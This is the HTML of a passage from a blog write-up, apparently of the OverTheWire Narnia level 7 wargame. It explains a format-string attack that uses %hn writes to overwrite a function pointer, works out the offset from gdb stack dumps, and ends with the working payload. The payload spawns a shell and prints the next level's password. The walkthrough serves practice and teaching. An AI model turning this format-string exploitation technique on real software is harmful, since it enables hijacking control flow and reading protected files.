+</div><p>HOB stands for <code>HighOrderedBytes</code> and LOB is <code>LowOrderedBytes</code>, these are 2byte chunks that need to be written. Write both and you can write any 4 byte address of your choosing anywhere you&rsquo;d like with direct parameter access. <code>addr</code> is the address that is to be written into - in the case of this challenge we are changing the address from pointing at <code>goodfunction</code> to point at <code>hackedfunction</code>. Offset is a bit more complicated, it is defined as the distance in 4 byte chunks between the pointer in memory to the format string and the beginning of the values in memory. Yes offset is a bit confusing, but working through it below should hopefully help clarify. Finally, the <code>hn</code> allows for just writing 2 bytes at a time.</p>
+<p>It seems much more confusing that it actually is - which is why it&rsquo;s magic. What&rsquo;s happening is that each of the <code>%[offset]$hn</code> needs an address to write to. The first one writes the 2 bytes for HOB by doing some magic with <code>%.[HOB-8]x</code> which provides the correct value to <code>%[offset]$hn</code> of the target <code>addr</code>. Then the same process is applied to LOB.</p>
+<p>Looking at the output from running <code>narnia7</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-txt" data-lang="txt">goodfunction() = 0x80486ff
+hackedfunction() = 0x8048724
+
+before : ptrf() = 0x80486ff (0xffffd658)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+</code></pre></td></tr></table>
+</div>
+</div><p>The goal is to write, <code>0x8048724</code>. So starting to plug in some values:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="n">[addr</span> <span class="o">+</span> <span class="m">2</span><span class="n">][addr]</span>  <span class="o">=</span> <span class="mh">0xffffd658</span> <span class="o">+</span> <span class="m">2</span>                  <span class="o">=</span> <span class="n">\x60\xd6\xff\xff\x58\xd6\xff\xff</span>
+<span class="o">%.[HOB – 8]x      = 0x0804 – 8 = 7FC(2044)          = %</span><span class="m">.2044</span><span class="n">x</span>
+<span class="o">%.[LOB – HOB]x    = 0x8724 – 0804 = 7F20(32544)     = %</span><span class="m">.32544</span><span class="n">x</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Which then gives the following format string, which is still missing the offset.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-txt" data-lang="txt">\x60\xd6\xff\xff\x58\xd6\xff\xff%.2044x%???$hn%.32544x%???$hn
+</code></pre></td></tr></table>
+</div>
+</div><p>Once again, the offset is defined as the distance between the pointer in memory to the format string and the beginning of the values in memory, so <code>gdb</code> can be used to help determine what that value would be.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-s" data-lang="s"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="n">AAAA</span>
+<span class="n">The</span> <span class="n">program</span> <span class="n">being</span> <span class="n">debugged</span> <span class="n">has</span> <span class="n">been</span> <span class="n">started</span> <span class="n">already.</span>
+<span class="n">Start</span> <span class="n">it</span> <span class="n">from</span> <span class="n">the</span> <span class="n">beginning</span><span class="o">?</span> <span class="p">(</span><span class="n">y</span> <span class="n">or</span> <span class="n">n</span><span class="p">)</span> <span class="n">y</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia7</span> <span class="n">AAAA</span>
+<span class="nf">goodfunction</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x80486ff</span>
+<span class="nf">hackedfunction</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x8048724</span>
+
+<span class="n">before</span> <span class="o">:</span> <span class="nf">ptrf</span><span class="p">()</span> <span class="o">=</span> <span class="mh">0x80486ff</span> <span class="p">(</span><span class="mh">0xffffd628</span><span class="p">)</span>
+<span class="n">I</span> <span class="n">guess</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">come</span> <span class="n">to</span> <span class="n">the</span> <span class="n">hackedfunction...</span>
+
+<span class="n">Breakpoint</span> <span class="m">1</span><span class="p">,</span> <span class="mh">0x080486ad</span> <span class="n">in</span> <span class="nf">vuln </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">ni</span>
+<span class="mh">0x080486b2</span> <span class="n">in</span> <span class="nf">vuln </span><span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="m">40</span><span class="n">xw</span> <span class="o">$</span><span class="n">esp</span>
+<span class="mh">0xffffd61c</span><span class="o">:</span> <span class="mh">0xffffd62c</span> <span class="mh">0x00000080</span> <span class="mh">0xffffd896</span> <span class="mh">0x080486ff</span>
+<span class="mh">0xffffd62c</span><span class="o">:</span> <span class="mh">0x41414141</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span> <span class="mh">0x00000000</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>In this instance the <code>offset</code> is <code>0xffffd62c - 0xffffd624 = 0x8 / 4byte chunks = 2</code>.</p>
+<p>Something that does happen on occasion is that the addresses shift around a bit as the programs crash/run through debuggers, so a quick run to make sure we have the current addresses.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">narnia7@narnia:/narnia$ ./narnia7 AAAA
+goodfunction<span class="o">()</span> <span class="o">=</span> 0x80486ff
+hackedfunction<span class="o">()</span> <span class="o">=</span> 0x8048724
+
+before : ptrf<span class="o">()</span> <span class="o">=</span> 0x80486ff <span class="o">(</span>0xffffd638<span class="o">)</span>
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunctio
+</code></pre></td></tr></table>
+</div>
+</div><p>Since it&rsquo;s not quite the same address as last time, a quick update to the values and the final payload is ready:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh">./narnia7 <span class="k">$(</span>python -c <span class="s1">&#39;print &#34;\x40\xd6\xff\xff\x38\xd6\xff\xff%.2044x%2$hn%.32544x%3$hn&#34;&#39;</span><span class="k">)</span>
+
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ cat /etc/narnia_pass/narnia8
+mohthuphog
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-08-02&nbsp;<i class="fas fa-hashtag fa-fw"></i>68e291e</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://noopz.github.io/narnia_challenges_part5/" data-title="Narnia Challenges (part 5)" data-hashtags="OTW,narnia,wargames"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://noopz.github.io/narnia_challenges_part5/" data-hashtag="OTW"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/otw/">OTW</a>,&nbsp;<a href="/tags/narnia/">narnia</a>,&nbsp;<a href="/tags/wargames/">wargames</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/narnia_challenges_part4/" class="prev" rel="prev" title="Narnia Challenges (part 4)"><i class="fas fa-angle-left fa-fw"></i>Narnia Challenges (part 4)</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Zack</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">cc by-nc 4.0</a></span><br><span class="asdf">&nbsp;<a href="/privacy" target="">Privacy Policy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{},"cookieconsent":{"content":{"allow":"Allow cookies","deny":"Decline","dismiss":"Allow cookies","link":"Learn more","message":"This website uses cookies to ensure you get the best experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"revokable":false,"theme":"edgeless","type":"info"},"gtagConfig":{"anonymize_ip":true,"enable":true,"tracking_id":"UA-168052344-1"}};</script><script type="text/javascript" src="/js/theme.min.cb3f77989212bebcd498d8b441c555574e00a1a1250508a430cf215c9f45bef736e721d5005ef144b47b2cd3997c2175c03977c50086fe4016eab32a8fe118b6.js" integrity="sha512-yz93mJISvrzUmNi0QcVVV04AoaElBQikMM8hXJ9Fvvc25yHVAF7xRLR7LNOZfCF1wDl3xQCG/kAW6rMqj&#43;EYtg=="></script>
+</body>
+</html>
